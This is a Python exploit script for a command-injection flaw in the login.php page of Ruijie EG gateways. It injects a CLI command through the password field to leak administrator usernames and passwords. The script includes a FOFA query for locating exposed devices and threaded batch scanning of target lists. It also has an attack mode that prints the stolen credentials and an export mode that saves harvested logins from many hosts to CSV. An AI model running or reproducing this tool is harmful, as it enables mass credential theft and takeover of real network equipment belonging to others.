#!/usr/bin/python3.7
# -*- coding: utf-8 -*-
# @Author : Sma11New
# @Github : https://github.com/Sma11New

import os
import csv
import time
import requests
from threading import Lock
from wcwidth import wcswidth as ww
from concurrent.futures import ThreadPoolExecutor, wait
from argparse import ArgumentParser

from colorama import init

init(autoreset=True)

requests.packages.urllib3.disable_warnings()

def rpad(s, n, c=" "):
    return s + (n - ww(s)) * c


class POC:
    vulnName = "Ruijie-EG_passLeaked"
    vulnNameZh = "锐捷EG易网关账号密码泄露漏洞"
    vulnDescribe = "锐捷EG易网关 login.php存在 CLI命令注入，导致管理员账号密码泄露漏洞"
    vulnNumber = "--"
    vulnTime = "--"
    vulnVersion = "--"
    vulnPath = "login.php"
    vulnScript = "目标单个验证、批量验证、批量导出"
    FOFA = 'app="Ruijie-EG易网关" / body="请输入您的RG-EG易网关的用户名和密码"'

    # -----------漏洞相关代码 开始-------------
    # 利用漏洞用于发包收包，判断是否存在漏洞，为关键代码

    # 利用漏洞
    def exploitVuln(self, url):
        reqURL = f"{url}/login.php"
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
            "Content-Type": "application/x-www-form-urlencoded",
            "X-Requested-With": "XMLHttpRequest",
        }
        postData = "username=admin&password=admin?show+webmaster+user"
        try:
            rep = requests.post(url=reqURL, data=postData, headers=headers, timeout=self.args.timeout, verify=False)
        except:
            return "Conn"
        try:
            data = str(rep.json()["data"])
            userData = list(data[data.find("00. ") + 3:].split())
            return userData
        except:
            return "Safe"

    # 验证漏洞
    def verify(self, url):
        # cmd = "echo '1233211234567'"
        repData = self.exploitVuln(url)
        if "Conn" not in repData and "Safe" not in repData:
            msg = f"\033[32m[+]  [Vuln]  {url.ljust(35)}\033[0m"
            if self.args.export:
                msg = f"\033[32m[+]  [Vuln]  {url.ljust(35)}  {repData[0].ljust(10)}  {repData[1]}\033[0m"
            if self.args.url:
                self.hasVuln = True
            if self.args.file:
                self.lock.acquire()
                try:
                    self.findCount += 1
                    self.vulnRULList.append([url, repData[0], repData[1]])
                finally:
                    self.lock.release()
        elif "Conn" == repData:
            msg = f"\033[31m[!]  [Conn]  {url}\033[0m"
        else:
            msg = f"[-]  [Safe]  {url}"
        self.lock.acquire()
        try:
            print(msg)
        finally:
            self.lock.release()

    # 单个攻击利用
    def attack(self):
        repData = self.exploitVuln(self.args.url)
        userList = repData
        print(f"\n{'userName'.ljust(15)}|{'passWord'}\n{'-' * 50}")
        print(f"{userList[0].ljust(15)}|{userList[1]}")
        print("\n")

    # -----------漏洞相关代码 结束-------------

    def __init__(self):
        self.banner()
        self.argsClass = self.parseArgs()
        self.args = self.argsClass.parse_args()
        self.hasVuln = False
        self.lock = Lock()
        self.start = time.time()
        self.run()

    def banner(self):
        length = 80
        logo = f"""
            ________            ___________       _____ 
            ___  __ \______________  /___(_)________  /_
            __  /_/ /  __ \  ___/_  / __  /__  ___/  __/
            _  ____// /_/ / /__ _  /___  / _(__  )/ /_         
            /_/     \____/\___/ /_____/_/  /____/ \__/      \033[32mAuthor:Sma11New\033[0m
        """
        msg = f"""
\033[36m+{"-" * (length + 20)}+\033[0m
|   漏洞名称   |   {rpad(self.vulnNameZh, length)}  |\n\033[36m+{"-" * (length + 20)}+\033[0m
|   漏洞描述   |   {rpad(self.vulnDescribe, length)}  |\n\033[36m+{"-" * (length + 20)}+\033[0m
|   漏洞时间   |   {rpad(self.vulnTime, length)}  |\n\033[36m+{"-" * (length + 20)}+\033[0m
|   漏洞编号   |   {rpad(self.vulnNumber, length)}  |\n\033[36m+{"-" * (length + 20)}+\033[0m
|   影响版本   |   {rpad(self.vulnVersion, length)}  |\n\033[36m+{"-" * (length + 20)}+\033[0m
|   漏洞路径   |   {rpad(self.vulnPath, length)}  |\n\033[36m+{"-" * (length + 20)}+\033[0m
|   脚本功能   |   {rpad(self.vulnScript, length)}  |\n\033[36m+{"-" * (length + 20)}+\033[0m
|   FOFA语句   |   {rpad(self.FOFA, length)}  |
\033[36m+{"-" * (length + 20)}+\033[0m
        """.replace("|", "\033[36m|\033[0m")
        print("\033[93m" + logo + "\033[0m")
        print(msg)

    # 初始化环境
    def init(self):
        print(f"\033[36m[*]  Thread:  {self.args.thread}\033[0m")
        print(f"\033[36m[*]  Timeout:  {self.args.timeout}\033[0m")
        msg = ""
        if os.path.isfile(self.args.file):
            msg += "\033[36m[*]  Load url file successfully\033[0m\n"
        else:
            msg += f"\033[31m[-]  Load url file {self.args.file} failed\033[0m\033[0m\n"
        print(msg)
        if "failed" in msg:
            print("\033[31[!]  Init failed, Please check the environment.\033[0m\n")
            exit(0)

    def parseArgs(self):
        date = time.strftime("%Y-%m-%d_%H-%M-%S", time.localtime())
        parser = ArgumentParser(description="\033[31mNotice：You Must To Use One Of -u/-f\033[0m")
        parser.add_argument("-u", "--url", required=False, type=str, metavar="", help=f"Target url, single verification")
        parser.add_argument("-f", "--file", required=False, type=str, metavar="", help=f"Url file, batch verification")
        parser.add_argument("-t", "--thread", required=False, type=int, metavar="", default=32, help=f"Thread, default 32")
        parser.add_argument("-T", "--timeout", required=False, type=int, metavar="", default=3, help="Request timeout, default 3s")
        parser.add_argument("-o", "--output", required=False, type=str, metavar="", default=date, help="Output file, default {date}.txt")
        parser.add_argument("--attack", required=False, action="store_true", default=False, help="Single target utilization, need to specify -u")
        parser.add_argument("--export", required=False, action="store_true", default=False, help="Export account passwords in batches, need to specify -f")
        return parser

    # 处理url格式
    def parseURL(self, url):
        newURL = url
        if "https://" not in newURL and "http://" not in newURL:
            newURL = f"http://{newURL}"
        return newURL

    # 加载url地址(带http://)
    def loadURL(self):
        urlList = []
        with open(self.args.file, encoding="utf8") as f:
            for line in f.readlines():
                line = self.parseURL(line.strip())
                urlList.append(line)
        return urlList

    # 批量验证
    def multiVerify(self):
        self.findCount = 0
        self.vulnRULList = []
        executor = ThreadPoolExecutor(max_workers=self.args.thread)
        all = [executor.submit(self.verify, (url)) for url in self.urlList]
        wait(all)
        self.outputResult()

    # 依据参数选择模式
    def run(self):
        if not self.args.file and not self.args.url:
            self.argsClass.print_help()
        # 单个验证
        elif self.args.url:
            url = self.parseURL(self.args.url)
            print(f"\033[36m[*]  Timeout:  {self.args.timeout}\033[0m\n")
            self.verify(url)
            if self.args.attack:
                if self.hasVuln:
                    self.attack()
        # 批量验证
        else:
            self.init()
            self.urlList = self.loadURL()  # 所有目标
            self.multiVerify()

    # 输出结果
    def outputResult(self):
        print("\nattemptCount：\033[31m%d\033[0m   findCount：\033[32m%d\033[0m" % (len(self.urlList), self.findCount))
        self.end = time.time()
        print("Time Spent: %.2f" % (self.end - self.start))
        # 写文件
        if self.findCount > 0:
            if not os.path.isdir(r"./output"):
                os.mkdir(r"./output")
            if self.args.export:
                self.outputFile = f"./output/{self.vulnName}_{self.args.output}.csv"
                with open(self.outputFile, "a", encoding="gbk", newline="") as f:
                    csvWrite = csv.writer(f)
                    csvWrite.writerow(["URL", "UserName", "Password"])
                    for result in self.vulnRULList:
                        csvWrite.writerow(result)
            else:
                self.outputFile = f"./output/{self.vulnName}_{self.args.output}.txt"
                with open(self.outputFile, "a") as f:
                    for url in self.vulnRULList:
                        f.write(url[0] + "\n")
            print(f"{'-' * 20}\nThe vulnURL has been saved in \033[36m{self.outputFile}\033[0m\n\n")

if __name__ == "__main__":
    POC()
